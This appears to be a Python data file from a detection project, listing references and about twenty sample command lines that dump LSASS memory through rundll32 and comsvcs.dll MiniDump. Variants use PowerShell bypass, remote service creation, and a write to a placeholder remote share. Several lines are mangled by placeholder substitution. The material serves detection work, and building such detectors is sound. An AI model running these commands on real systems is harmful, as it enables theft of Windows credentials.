

# Common Variables
_shared_references = [
    {
        "source_name": "strontic",
        "url": "https://strontic.github.io/xcyclopedia/library/comsvcs.dll-67B51761A4BC3BD1B5367A22BA1A5B65.html"
    },
    {
        "source_name": "lolbas",
        "url": "https://lolbas-project.github.io/lolbas/Libraries/comsvcs/"
    },
    {
        "source_name": "JohnLaTxC",
        "url": "https://gist.github.com/JohnLaTwC/3e7dd4cd8520467df179e93fb44a434e"
    },
    {
        "source_name": "Modexp",
        "url": "https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/"
    },
    {
        "source_name": "hawk-eye.io",
        "url": "https://hawk-eye.io/2022/09/tools-used-for-dumping-of-rdpcreds-via-comsvcs-dll/"
    },
    {
        "source_name": "ired.team",
        "url": "https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz"
    },
    {
        "source_name": "lsassy",
        "url": "https://github.com/login-securite/lsassy/blob/14d8f8ae596ecf22b449bfe919829173b8a07635/lsassy/dumpmethod/comsvcs.py"
    }
]


_p0001_evidence_list = [
    {
        "process_command_line": r'''"C:\Windows\System32\rundll32.exe"  C:\Windows\System32\comsvcs.dll MiniDump <PID> \Windows\Temp\<filename>.dmp full'''
    },
    {
        "process_command_line": r'''.\rundll32.exe  C:\windows\System32\comsvcs.dll, MiniDump <PID> C:\Users\Administrator\<filename>.dmp full ''',
    },
    {
        "process_command_line": r'''"C:\Windows\system32\sc.exe" \\server create Dump binpath= "C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump <PID> C:\dump.bin full"''',
    },
    {
        "process_command_line": r'''"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -c rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Users\username\Desktop\<filename>.DMP full''',
    },
    {
        "process_command_line": r'''"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID>Get-Process lsass).id $env:TEMP\lsass-<filename>.dmp full}''',
    },
    {
        "process_command_line": r'''"Powershell" -c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID>get-process lsass).id C:\Users\username\AppData\Local\Temp\<filename>.dmp full"''',
    },
    {
        "process_command_line": r'''"C:\Windows\system32\cmd.exe /c "echo string >NUL & powershell -ExecutionPolicy bypass -Command "$a = (Get-Process lsass).id; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID>a C:\Windows\TEMP\string\string\<filename>.dmp full" & exit"''',
    },
    {
        "process_command_line": r'''"C:\Windows\system32\cmd.exe /Q /c echo .\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> C:\Users\Administrator\<filename>.dmp full ^> \\127.0.0.1\C$\__output 2^>^&1 > C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat''',
    },
    {
        "process_command_line": r'''C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.EXE "rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID>get-process lsass).id) C:\Windows\lsass_$(Get-Date -Format dd-MM-hh-mm-ss<filename>dmp full"'''
    },
    {
        "process_command_line": r'''C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe powershell.exe -NoP -C C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID>Get-Process lsass).Id \Windows\Temp\<filename>.dmp '''
    },
    {
        "process_command_line": r'''cmd /C "rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> \\ipv4\pwn\<filename>.dmp full"'''
    },
    {
        "process_command_line": r'''cmd.exe  /Q /c for /f "tokens=1,2 delims= " %A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> \Windows\Temp\<filename>.dmp full'''
    },
    {
        "process_command_line": r'''cmd.exe /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> \Windows\Temp\<filename>.dmp full'''
    },
    {
        "process_command_line": r'''cmd.exe /C cmd.exe /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> \Windows\Temp\<filename>.dmp full'''
    },
    {
        "process_command_line": r'''cmd.exe /C powershell.exe -NoP -C "C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID>Get-Process lsass).Id \Windows\Temp\<filename>.dmp full;Wait-Process -Id (Get-Process rundll32).id"'''
    },
    {
        "process_command_line": r'''cmd.exe /Q /c powershell -noni -nop "rundll32.exe comsvcs.dll,minidump <PID> c:\windows\temp\test.log full" 1> \\127.0.0.1\ADMIN$\__1111111.1111111 2>&1'''
    },
    {
        "process_command_line": r'''cmd.exe /Q /c rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> C:\<filename>.dmp full 1> \\127.0.0.1\ADMIN$\__1111111.1111111 2>&1'''
    },
    {
        "process_command_line": r'''powershell  -ExecutionPolicy bypass -Command "$a = (Get-Process lsass).id; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID>a C:\temp\blabla"'''
    },
    {
        "process_command_line": r'''powershell  -noni -nop "rundll32.exe comsvcs.dll,minidump <PID> c:\windows\temp\test.log full"'''
    },
    {
        "process_command_line": r'''powershell.exe -ExecutionPolicy Bypass -C "C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID>Get-Process lsass).id $env:TEMP\lsass-<filename>.dmp full"'''
    }
]